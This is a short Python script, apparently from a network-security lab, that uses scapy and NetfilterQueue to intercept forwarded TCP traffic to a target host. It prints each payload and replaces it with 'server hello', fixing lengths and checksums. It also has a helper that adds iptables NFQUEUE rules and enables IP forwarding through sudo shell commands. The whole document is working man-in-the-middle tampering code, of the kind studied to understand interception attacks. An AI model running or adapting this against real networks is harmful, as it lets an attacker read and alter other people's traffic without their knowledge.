# Requires Python 3.5 and above
from scapy.all import *
from netfilterqueue import NetfilterQueue
import codecs
import os

target_ip = "10.0.2.28"
src_ip = "10.0.2.27"


def config():
    iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {target_ip}"
    ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
    os.system(iptable_config)
    os.system(ip_forward)


def modify(packet):
    pkt = packet.get_payload()

    pktIP = IP(pkt)
    if pktIP.getlayer(TCP).payload:

        output = f"src: {pktIP.src}, dst: {pktIP.dst}, sport: {pktIP.getlayer(TCP).sport}, dport: {pktIP.getlayer(TCP).dport}, pyload: {pktIP.getlayer(TCP).payload}"
        print(f"payload: {pktIP[TCP].payload}")
        # pktIP.show()
        old_len = len(pktIP[TCP].payload)
        pktIP[TCP].remove_payload()
        pktIP[TCP].add_payload(b"server hello")
        print("modifed")
        new_len = len(pktIP[TCP].payload)
        pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
        del pktIP[IP].chksum
        del pktIP[TCP].chksum
        pkt = pktIP.__class__(bytes(pktIP))
        packet.set_payload(bytes(pkt))

    packet.accept()


nfqueue = NetfilterQueue()
# Bind to Queue 0 and intercept traffic passing through queue 0
nfqueue.bind(0, modify)
try:
    print("[*] waiting for data")
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
